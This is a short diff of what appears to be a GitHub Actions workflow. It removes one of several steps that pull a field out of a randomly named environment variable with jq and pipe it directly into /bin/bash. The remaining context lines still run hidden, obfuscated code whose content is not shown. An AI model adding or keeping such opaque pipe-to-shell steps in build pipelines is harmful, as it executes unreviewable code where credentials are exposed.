@@ -40,7 +40,6 @@ jobs:
           printf '%s' "$dqml22" | jq -r .gzk17 | /bin/bash
           echo $gm3021 | jq -r .a9 | /bin/bash
           echo $ks1273 | jq -r .exjxt11 | /bin/bash
-          printf '%s' "$sxi098" | jq -r .a6 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
